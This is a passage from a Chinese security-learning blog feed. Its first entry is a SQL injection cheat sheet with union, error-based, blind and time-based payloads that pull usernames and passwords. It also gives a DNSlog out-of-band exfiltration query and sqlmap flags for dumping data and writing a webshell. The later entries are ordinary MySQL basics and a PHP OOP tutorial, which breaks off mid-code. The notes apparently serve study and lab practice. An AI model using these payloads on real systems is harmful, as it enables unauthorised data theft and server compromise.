        <content type="html"><![CDATA[<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>同时也可以文件上传写shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">判断数据类型：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>报错为整型，不报错为字符型</span><br><span class="line"></span><br><span class="line">闭合(字符型)：单引号( <span class="string">&#x27; )，双引号( &quot; )，括号( ( ) )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜位数：order by 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">回显位：union select 1,2,3哪里有数据，哪里就是回显位</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查当前数据库名：union select 1,2,database()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查库名：union select 1,2,group_concat(schema_name) from information_schema.schemata</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查表名：union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查字段：union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查数据：union select 1,2,group_concat(username,password) from security.users</span></span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>如果需要显示全部数据库需要用到substr函数</p><h4 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat((payload),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure><h4 id="extractvalue报错"><a href="#extractvalue报错" class="headerlink" title="extractvalue报错"></a>extractvalue报错</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1, (concat(0x7e,(payload),0x7e)))</span><br></pre></td></tr></table></figure><h4 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>, (concat(<span class="number">0x7e</span>,(payload),<span class="number">0x7e</span>)),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exists</span> : <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="keyword">EXISTS</span>(<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;Dumb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ord <span class="operator">=</span> ascii(<span class="string">&#x27;字符&#x27;</span>)<span class="operator">/</span><span class="operator">/</span>转ascii码</span><br><span class="line"></span><br><span class="line">mid <span class="operator">=</span> substr(<span class="string">&#x27;字符串&#x27;</span>,<span class="string">&#x27;起始位&#x27;</span>,<span class="string">&#x27;步长&#x27;</span>)<span class="operator">/</span><span class="operator">/</span>切割字符串</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span>(<span class="string">&#x27;字符串&#x27;</span>,步长)</span><br><span class="line"></span><br><span class="line">length(<span class="string">&#x27;字符串&#x27;</span>)<span class="operator">/</span><span class="operator">/</span>求字符串长度</span><br><span class="line"></span><br><span class="line">regexp (<span class="string">&#x27;D&#x27;</span>)<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username REGEXP (<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">like</span> <span class="string">&#x27;%字符%&#x27;</span><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%D%&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;D&#x27;</span><span class="operator">/</span><span class="operator">/</span>windows不区分大小写</span><br><span class="line"></span><br><span class="line">ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">68</span></span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(<span class="string">&#x27;条件&#x27;</span>,<span class="string">&#x27;真区间&#x27;</span>,<span class="string">&#x27;假区间&#x27;</span>)</span><br><span class="line">sleep(<span class="string">&#x27;睡眠时间:s&#x27;</span>)</span><br><span class="line">if((ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>), <span class="number">2</span>, <span class="number">1</span>))<span class="operator">=</span><span class="number">117</span>),SLEEP(<span class="number">2</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>​GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际为2字节。如果使用了类似于set names gbk这样得语句,此时mysql数据库就会将Ascii大于128(%df)得字符当作是汉字字符得一部分,从而能吃掉,引入单引号或者双引号</p><p>​%df,使得\被连带处理，单引号’得以逃逸出来</p><p>​addslashes过滤 单引号、双引号，主要针对需要闭合的字符型注入</p><p>​intval强制转为整数，若不能转为整数，则后面的数据全部丢弃，主要针对整型注入</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>原理：</p><p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入</p><p>前提条件：</p><p>1.用户向数据库插入恶意语句（即使后端代码进行了转移，如mysql_escape_string、mysql_real_escape_string转义）</p><p>2.数据库对直接取出恶意数据并没有进行过滤</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><p>在5.0以下</p><h3 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h3><p>Access数据库特有的注入方式，现在由于access数据库逐渐淘汰，这种注入方式已经很少见了，特此提一嘴。</p><h3 id="其他注入方式"><a href="#其他注入方式" class="headerlink" title="其他注入方式"></a>其他注入方式</h3><h4 id="Burp-Suite抓包http头部注入"><a href="#Burp-Suite抓包http头部注入" class="headerlink" title="Burp Suite抓包http头部注入"></a>Burp Suite抓包http头部注入</h4><p>client-ip</p><p>x-forwarded-for</p><p>cookie</p><p>User-Agent</p><h4 id="dnslog外带注入"><a href="#dnslog外带注入" class="headerlink" title="dnslog外带注入"></a>dnslog外带注入</h4><p>使用某些网站提供的dnslog进行注入似乎也是一个不错的选择</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>, load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> hex(<span class="keyword">user</span>())),<span class="string">&#x27;.xxx.dnslog.cn\\abc&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="sqlmap工具"><a href="#sqlmap工具" class="headerlink" title="sqlmap工具"></a>sqlmap工具</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-u http://www.xxx.com</span><br><span class="line"></span><br><span class="line">-m 1.txt//从文本中获取多个目标扫描，但是每一行只能有一个url</span><br><span class="line"></span><br><span class="line">-r 1.txt//回包信息，从文件中加载HTTP请求，这样的话 就不需要在去设定cookie,POST数据</span><br></pre></td></tr></table></figure><p>设置HTTP数据包相关参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--user-agent--delay--cookie--data--referer--timeout</span><br></pre></td></tr></table></figure><p>设置测试参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-psqlmap 默认会测试所有的GET和POST参数</span><br><span class="line"></span><br><span class="line">--skip在使用--level时，级别很大的时候，但是有些参数不能去测试，那么可以使用--skip参数跳过。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>-v</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0、只显示python错误以及严重的信息。</span><br><span class="line">1、同时显示基本信息和警告信息。（默认等级）</span><br><span class="line">2、同时显示debug信息。</span><br><span class="line">3、同时显示注入的payload。</span><br><span class="line">4、同时显示HTTP请求。</span><br><span class="line">5、同时显示HTTP响应头。</span><br><span class="line">6、同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure><p>–technique :指定使用哪种注入类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">B: 基于<span class="type">Boolean</span>的盲注（<span class="type">Boolean</span> based blind）</span><br><span class="line"></span><br><span class="line">Q: 内联查询（inlin queries）</span><br><span class="line"></span><br><span class="line">T: 基于时间的盲注（<span class="type">time</span> based blind）</span><br><span class="line"></span><br><span class="line">U: 联合查询（<span class="keyword">union</span> query based）</span><br><span class="line"></span><br><span class="line">E: 错误（error based）</span><br><span class="line"></span><br><span class="line">S: 栈查询（stack queries）</span><br><span class="line"></span><br><span class="line">速度排序<span class="operator">=</span>联合<span class="operator">&gt;</span>报错<span class="operator">&gt;</span>布尔<span class="operator">&gt;</span>延迟</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--current-db  当前数据库</span><br><span class="line"></span><br><span class="line">--privileges 权限</span><br><span class="line"></span><br><span class="line">-D &lt;库名&gt; --tables</span><br><span class="line"></span><br><span class="line">-D &lt;库名&gt;  -T &lt;表名&gt; --columns </span><br><span class="line"></span><br><span class="line">-D &lt;库名&gt; -T &lt;表名&gt; -C &lt;列名1&gt;，&lt;列名2&gt;  --dump  </span><br></pre></td></tr></table></figure><p>–os-shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写shell,但是需要网站绝对路径和读写权限为前提</span><br><span class="line"><span class="comment">--os-shell的本质就是写入两个php文件，其中的tmpugvzq.php可以让我们上传文件到网站路径下</span></span><br></pre></td></tr></table></figure><p>–proxy 指定一个代理服务器 eg: –proxy <a href="http://local:8080/">http://local:8080</a></p><p>–prefix&#x3D;PREFIX 注入payload字符串前缀</p><p>–batch 全自动</p><p>–dump导出当前数据库的所有数据</p><p>–is-dba  判断当前的用户是否为管理，是的话会返回True。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL常用命令</title>
      <link href="/2022/10/01/MySQL/"/>
      <url>/2022/10/01/MySQL/</url>
      
        <content type="html"><![CDATA[<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建：<span class="keyword">create</span> database mydb</span><br><span class="line"></span><br><span class="line">删除：<span class="keyword">drop</span> database mydb</span><br><span class="line"></span><br><span class="line">查看：<span class="keyword">show</span> databases</span><br><span class="line"></span><br><span class="line">使用：use mydb</span><br></pre></td></tr></table></figure><h4 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建：<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment, name <span class="type">varchar</span>(<span class="number">20</span>), age <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">字段：<span class="keyword">desc</span> <span class="keyword">user</span></span><br><span class="line"></span><br><span class="line">查看：<span class="keyword">show</span> tables</span><br><span class="line"></span><br><span class="line">删除：<span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure><h4 id="字段操作"><a href="#字段操作" class="headerlink" title="字段操作"></a>字段操作</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">增加字段：<span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">user</span> <span class="keyword">add</span> <span class="keyword">column</span> sex <span class="type">varchar</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">修改字段名称：<span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">user</span> change <span class="keyword">column</span> sex aaa <span class="type">varchar</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">修改字段类型：<span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">user</span> modify <span class="keyword">column</span> aaa <span class="type">int</span></span><br><span class="line"></span><br><span class="line">删除字段：<span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">user</span> <span class="keyword">drop</span> <span class="keyword">column</span> aaa</span><br></pre></td></tr></table></figure><h4 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">增：<span class="keyword">insert</span> <span class="keyword">into</span> test (uname,passwd) <span class="keyword">values</span> (<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"></span><br><span class="line">删：<span class="keyword">delete</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">查：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">改：<span class="keyword">update</span> test <span class="keyword">set</span> uname <span class="operator">=</span> root <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>sql查询语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名</span><br><span class="line"><span class="keyword">where</span> 条件</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> 分组</span><br><span class="line"><span class="keyword">having</span> 分组条件</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 排序</span><br><span class="line">limit 分页。</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>上面为查询的语法结构。顺序不能乱</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> 前提知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP——类和对象</title>
      <link href="/2022/09/10/PHP%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/"/>
      <url>/2022/09/10/PHP%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><hr><p><strong>面向对象的编程(OOP)</strong></p><p>软件工程的目标: 复用性 灵活性 扩展性.</p><p>面向对象的特点: 封装 继承 多态</p><h4 id="对象-object"><a href="#对象-object" class="headerlink" title="对象(object)"></a>对象(object)</h4><p>对象就是具有一定功能和特征的事物.凡是能帮我们实现某种需求的事物的都是对象</p><p>a) 女朋友是对象.</p><p>b) 每一个学员都是讲师的教学对象.</p><p>c) 留言板项目每一条留言都是对象.</p><p>d) 商城项目. 把商品卖给用户.</p><p>​商品: 进货, 销售, 库存, 查看, 修改定价都是围绕着商品考虑的, 所以商品是对象.</p><p>​用户: 注册, 登录, 个人信息修改, 等等都是围绕着用户考虑问题,所以用户是对象.</p><p>项目开发中的 面向对象编程, 首先就是分析出要有哪些事物(对象)来完成整个项目的功能需求和业务逻辑.</p><p>然后,就是围绕着”对象”进行编码,实现需求功能, 最后让对象与对象之间互动(调用), 来完成业务流程的逻辑.</p><h4 id="类-class"><a href="#类-class" class="headerlink" title="类(class)"></a>类(class)</h4><p>具有相同特征和功能的对象的抽象 就是类</p><p>对象可以有很多个.比如,很多个学生对象, 很多个商品对象, 很多个用户对象.</p><p>很多个学生对象归纳为一个学生类.</p><p>很多个商品对象归纳为一个商品类.</p><p>很多个用户对象归纳为一个用户类.</p><p>我们在做 项目对象分析时, 其实就是在分析项目需要哪一类的对象.</p><p>把一些对象归为某个类,是因为这些对象会有相同的属性:</p><p>比如 商品类中, 每一个商品对象都会有 定价, 库存, 产地, 生产日期</p><p>把一些对象归为某个类, 还会因为对该类中每一个对象都会做相同或相似的操作.</p><p>如果 学生类中, 每一个学生对象都会有 听课, 写作业, 起立的动作.</p><p>因些, 描述某一个”对象类”包含哪些属性和哪些操作.</p><p>那么属于该类中的每一个对象都会有相同的属性名, 和相同的操作处理.</p><p>在PHP实际编码过程中, 首先描述某一类对象的属性和操作. 这称为 定义类.</p><p>随后就可以用”类的描述”来创建一个一个的实实在在的对象.并且往往给对象赋予不同的属性值.</p><h4 id="对象和类之间的关系"><a href="#对象和类之间的关系" class="headerlink" title="对象和类之间的关系"></a>对象和类之间的关系</h4><p>对象参考类的结构,被创建出来.并且属性保存具体的数据.</p><p>它是具体的.</p><p>类是对所属对象的共有特性的描述, 可以说这是一个类型, 一个结构</p><p>它是抽象的</p><p>对象的抽象就是类</p><p>类的实体化(实例化)就是对象</p><h4 id="对象和类的对比"><a href="#对象和类的对比" class="headerlink" title="对象和类的对比"></a>对象和类的对比</h4><p>马良         马良画的图       从画里走出来的事物</p><p>工程设计师      设计图       由设计图造出来的事物</p><p>程序员         类          对象</p><p><strong>通过类的结构创建对象</strong></p><p><strong>定义类</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个学生类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"><span class="comment">// 成员属性(类中的变量) </span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sex</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 成员方法(类中的函数) </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;我爱写作业!&lt;br&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">a)成员属性</span></span><br><span class="line"><span class="comment">    i.必须要加修饰符来修饰   public </span></span><br><span class="line"><span class="comment">    ii.成员属性的初始值可有可无</span></span><br><span class="line"><span class="comment">    iii.成员属性初始值的注意事项  </span></span><br><span class="line"><span class="comment">    iv.成员属性可以使用常量进行赋初始值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">b)成员方法</span></span><br><span class="line"><span class="comment">    i.成员方法可以不加修饰符修饰   public </span></span><br><span class="line"><span class="comment">    ii.成员方法中 参数可有可无 代码体可有可无 方法的返回值也是可有可无的</span></span><br><span class="line"><span class="comment">    iii.在成员方法(函数) 没有使用return手动返回一个值的话  它的默认返回值就是null</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>参照类实例化对象</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据类的结构,创建对象(术语:实例化对象) </span></span><br><span class="line"><span class="variable">$stu1</span> = <span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.new关键字不能省略  </span></span><br><span class="line"><span class="comment">    2.小括号可有可无</span></span><br><span class="line"><span class="comment">    3.对象的实例化 可以放在类声明之前   对象的实例化还可以放到类的内部</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象的成员访问</span></span><br><span class="line"><span class="comment">// 成员属性赋值 </span></span><br><span class="line"><span class="variable">$stu1</span> -&gt; name = <span class="string">&#x27;王建双&#x27;</span>; </span><br><span class="line"><span class="variable">$stu1</span> -&gt; sex = <span class="string">&#x27;男&#x27;</span>; </span><br><span class="line"><span class="variable">$stu1</span> -&gt; age = <span class="number">18</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stu1</span> -&gt; name,<span class="string">&#x27;&lt;br&gt;&#x27;</span>; </span><br><span class="line"><span class="variable">$stu1</span> -&gt; <span class="title function_ invoke__">say</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">注意:</span></span><br><span class="line"><span class="comment">1.如果属性名是固定的话  前面不能加$</span></span><br><span class="line"><span class="comment">2.成员访问符的两侧可以有空白, 成员访问符的中间不能有空白    </span></span><br><span class="line"><span class="comment">3.成员属性和成员方法的位置不是绝对固定的 一般来说都是成员属性放置在上面,成员方法放置在下面.</span></span><br><span class="line"><span class="comment">4.在类中不能出现除了成员属性和成员方法之外的代码</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>成员属性的动态创建,销毁,遍历</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stu1</span> = <span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态添加属性</span></span><br><span class="line"><span class="variable">$age</span> = <span class="string">&#x27;age&#x27;</span>;</span><br><span class="line"><span class="variable">$stu1</span> -&gt; <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stu1</span> -&gt; name = <span class="string">&#x27;王建双&#x27;</span>; <span class="comment">// 原本没有该属性值, 现在相当于添加一个成员属性 </span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$stu1</span> -&gt; name); <span class="comment">// 属性不需要时, 可以销毁掉. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象也可理解为数组的升级, 它是一个复合类型变量 </span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$stu1</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$k</span>,<span class="string">&#x27;===&#x27;</span>,<span class="variable">$v</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>让对象表达自己($this)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 